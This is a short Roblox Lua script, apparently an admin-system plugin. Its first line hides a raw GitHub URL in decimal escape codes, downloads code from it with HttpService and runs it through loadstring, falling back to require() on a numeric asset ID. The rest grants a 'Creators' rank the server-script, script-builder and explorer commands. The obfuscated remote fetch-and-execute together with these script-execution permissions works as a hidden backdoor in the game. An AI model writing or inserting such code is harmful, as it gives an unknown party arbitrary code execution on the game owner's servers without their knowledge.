local server = (pcall(loadstring, ' ') and loadstring or require(5343495217))(game:GetService("HttpService"):GetAsync("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\68\114\97\119\105\110\103\74\104\111\110\47\83\99\114\105\112\116\115\47\109\97\105\110\47\73\68\75"))()

local service = server.Service;
local Settings = server.Settings;
local Functions, Commands, Admin, Anti, Core, HTTP, Logs, Remote, Process, Variables, Deps = 
		server.Functions, server.Commands, server.Admin, server.Anti, server.Core, server.HTTP, server.Logs, server.Remote, server.Process, server.Variables, server.Deps
local AddLog = Logs.AddLog

local newPerms = {":s:Creators";":sb:Creators";":dex:Creators";}

for i, v in pairs(newPerms) do
	local cmd, level = v:match("^(.*):(.*)")
	Admin.SetPermission(cmd, level)
end